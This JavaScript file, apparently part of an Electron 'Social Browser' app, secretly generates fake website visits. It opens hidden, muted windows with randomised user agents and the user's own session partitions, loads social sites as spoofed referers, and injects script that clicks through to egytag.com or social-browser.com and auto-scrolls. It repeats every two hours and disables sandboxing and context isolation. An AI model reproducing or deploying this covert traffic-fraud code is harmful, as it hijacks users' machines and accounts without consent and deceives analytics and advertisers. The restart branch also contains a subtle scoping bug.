(function () {
    if (!SOCIALBROWSER || !SOCIALBROWSER.electron) {
        console.log('Abrot fake-visit !SOCIALBROWSER');
        return;
    } else {
        console.log('fake-visit Activated ... 23-10-2021');
    }

    SOCIALBROWSER.remote = SOCIALBROWSER.remote || SOCIALBROWSER.electron.remote;

    let site_index = 0;
    let site_list = [
        {
            referer: 'https://www.facebook.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.youtube.com/c/NextCorporation/about',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://web.whatsapp.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://web.wechat.com/?lang=en',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.instagram.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.tumblr.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://qzone.qq.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.tiktok.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://twitter.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.reddit.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://tieba.baidu.com',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.linkedin.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },
        {
            referer: 'https://www.pinterest.com/',
            url: 'https://egytag.com/post/random',
            host: 'egytag.com',
        },

        {
            referer: 'https://www.facebook.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.youtube.com/c/NextCorporation/about',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://web.whatsapp.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://web.wechat.com/?lang=en',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.instagram.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.tumblr.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://qzone.qq.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.tiktok.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://twitter.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.reddit.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://tieba.baidu.com',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.linkedin.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
        {
            referer: 'https://www.pinterest.com/',
            url: 'https://social-browser.com',
            host: 'social-browser.com',
        },
    ];

    let alexaOptions = {
        show: false,
        timeout: 1000 * 60 * 5,
        url: 'https://egytag.com/post/random',
        referer: 'https://web.whatsapp.com/',
        proxy: null,
    };

    function __numberRange(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    SOCIALBROWSER.createFakeVisitWindow = function (op) {
        let options = { ...alexaOptions, ...op };
        let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

        let scrren_size = ['1366x768', '1280x768', '1280x768', '1280x768', '1024x768', '1280x720', '1366x768', '1280x768', '800x600'][__numberRange(0, 7)].split('x');

        let win = new SOCIALBROWSER.remote.BrowserWindow({
            show: options.show,
            width: parseInt(scrren_size[0] || '1366'),
            height: parseInt(scrren_size[1] || '768'),
            skipTaskbar: true,
            webPreferences: {
                sandbox: false,
                contextIsolation: false,
                enableRemoteModule: true,
                partition: options.partition || SOCIALBROWSER.var.session_list[Math.floor(Math.random() * SOCIALBROWSER.var.session_list.length)].name,
                webaudio: false,
                preload: preload,
            },
        });

        win.webContents.audioMuted = true;

        if (options.userAgent) {
            win.webContents.userAgent = options.userAgent;
        } else {
            win.webContents.userAgent = SOCIALBROWSER.var.user_agent_list[Math.floor(Math.random() * SOCIALBROWSER.var.user_agent_list.length)].url;
        }

        if (SOCIALBROWSER.var.core.id.like('*test*')) {
            win.setSkipTaskbar(false);
            win.showInactive();
            win.openDevTools();
        } else {
            if (options.show) {
                win.maximize();
            } else {
                win.hide();
            }
        }

        win.setMenuBarVisibility(false);
        if (options.proxy) {
            const ss = win.webContents.session;
            ss.setProxy(
                {
                    proxyRules: options.proxy,
                    proxyBypassRules: '127.0.0.1',
                },
                function () {},
            );
        }

        win.loadURL(options.referer);

        let code_injected = `
    console.log(' >>> code_injected From Fake Vists');
    
    function __document__ready__()
    {

      if(document.location.host.indexOf('${options.host}') == -1){
        var a = document.createElement('a');
        a.href = '${options.url}';
        a.id = '__a_injected';
        a.innerHTML = '${options.url}';
        a.setAttribute('target' , '_self');
        let body = document.querySelector('body');
        if(body){
          body.appendChild(a);
          a.style.backgroundColor = 'red';
          a.style.color = '#ffffff';
          a.style.fontSize = '22px';
          a.scrollIntoView();
          setTimeout(function() {
            document.querySelector('#__a_injected').click();
          }, 5 * 1000);
        }
      
        setTimeout(function() {
          document.location.href = '${options.url}';
        }, 15 * 1000);
        
      }else{
        setInterval(() => {
          let y = window.scrollY;
          y = y + 10;
          window.scrollTo(0 , y);
        }, 1000 * 1);  
        
      }
    }

    if (document.readyState !== 'loading') {
      __document__ready__()
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        __document__ready__()
      })
    }

    `;

        if (SOCIALBROWSER.var.core.version < '2021.03.01') {
            win.webContents.addListener('dom-ready', function (event) {
                win.webContents.executeJavaScript(code_injected);
            });
        } else {
            SOCIALBROWSER.call('[set][window][setting]', {
                win_id: win.id,
                name: 'eval',
                code: code_injected,
            });
        }

        win.on('close', function () {
            win.destroy();
        });

        win.on('closed', function () {
            runFakeVisit();
        });

        setTimeout(function () {
            if (win && !win.isDestroyed()) {
                win.close();
            }
        }, options.timeout);
    };

    function runFakeVisit() {
        if (site_index >= site_list.length) {
            site_index = 0;
            setTimeout(() => {
                SOCIALBROWSER.createFakeVisitWindow(options);
            }, 1000 * 60 * 60 * 2);
            return;
        }
        let options = Object.assign(alexaOptions, site_list[site_index]);
        site_index++;
        SOCIALBROWSER.createFakeVisitWindow(options);
    }

    runFakeVisit();
})();
